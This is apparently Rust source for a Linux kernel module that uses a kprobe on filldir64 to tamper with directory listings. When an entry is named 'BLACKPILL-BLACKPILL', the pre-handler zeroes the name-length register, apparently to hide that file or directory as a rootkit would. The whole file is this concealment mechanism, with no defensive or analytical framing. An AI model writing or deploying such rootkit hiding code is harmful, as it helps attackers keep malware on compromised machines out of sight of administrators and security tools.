use core::ffi::c_char;
use kernel::{
    bindings::{self, pt_regs},
    c_str,
    prelude::*,
};

use super::{hook, KProbe};

pub(crate) fn sys_hook() {
    let symbol = c_str!("filldir64");
    hook(symbol.as_char_ptr(), pre_handler, post_handler)
        .expect("Failed to hook sys_SYSCALL");
}

pub(crate) unsafe extern "C" fn pre_handler(_p: *mut KProbe, _regs1: *mut pt_regs) -> i32 {
    unsafe {
        pr_info!("filldir64 pre_handler\n");
        process_dir_pointer(_regs1)
    }
}

pub(crate) unsafe extern "C" fn post_handler(
    _p: *mut KProbe,
    _regs1: *mut pt_regs,
    _flags: u64,
) -> i32 {
    0
}

unsafe fn process_dir_pointer(_regs1: *mut pt_regs) -> i32 {
    unsafe {
        let dir_ptr: *const c_char = (*_regs1).si as *const i8;
        
        if dir_ptr as u64 != 0 {
            check_blackpill_marker(dir_ptr, _regs1);
        }
        
        0
    }
}

unsafe fn check_blackpill_marker(dir_ptr: *const c_char, _regs1: *mut pt_regs) {
    unsafe {
        if bindings::strcmp(dir_ptr, c_str!("BLACKPILL-BLACKPILL").as_char_ptr()) == 0 {
            (*_regs1).dx = 0;
        }
    }
}
